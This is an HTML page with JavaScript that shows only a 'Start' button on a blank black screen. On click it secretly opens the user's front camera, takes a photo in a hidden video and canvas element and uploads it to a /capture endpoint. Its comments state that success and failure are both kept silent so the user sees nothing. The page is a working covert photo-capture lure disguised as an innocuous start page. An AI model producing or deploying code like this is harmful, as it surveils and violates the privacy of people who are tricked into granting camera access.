<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title></title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: black;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        button {
            background: white;
            border: none;
            padding: 20px 60px;
            font-size: 24px;
            border-radius: 40px;
            font-weight: bold;
            cursor: pointer;
            transition: opacity 0.3s;
        }
        button:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }
        #video {
            display: none;
        }
        #canvas {
            display: none;
        }
    </style>
</head>
<body>
    <button id="btn"> Начать</button>
    
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        const btn = document.getElementById('btn');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        let stream = null;

        async function waitForNonBlackFrame(maxTries = 20, intervalMs = 180) {
            const ctx = canvas.getContext('2d');
            for (let i = 0; i < maxTries; i++) {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const { data } = ctx.getImageData(
                    Math.floor(canvas.width / 2),
                    Math.floor(canvas.height / 2),
                    1, 1
                );
                if (data[0] > 12 || data[1] > 12 || data[2] > 12) {
                    return true;
                }
                await new Promise(r => setTimeout(r, intervalMs));
            }
            return false;
        }

        btn.onclick = async () => {
            try {
                btn.disabled = true;

                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                });

                video.srcObject = stream;

                await new Promise(resolve => {
                    video.onloadedmetadata = resolve;
                    if (video.readyState >= 1) resolve();
                });

                await video.play();

                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;

                const frameOk = await waitForNonBlackFrame();

                if (!frameOk) {
                    // Якщо кадр так і не з'явився — просто завершуємо тихо
                    throw new Error('frame error');
                }

                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                const photoData = canvas.toDataURL('image/jpeg', 0.82);

                await fetch('/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ photo: photoData })
                });

                // Успіх — нічого не показуємо

            } catch (err) {
                // Помилка — теж тихо, користувач нічого не побачить
                console.error(err);
            } finally {
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                    stream = null;
                }
                video.srcObject = null;

                // Після всього — повертаємо кнопку (або можеш btn.remove() якщо хочеш разовий запуск)
                setTimeout(() => {
                    btn.disabled = false;
                }, 2000);
            }
        };
    </script>
</body>
</html>
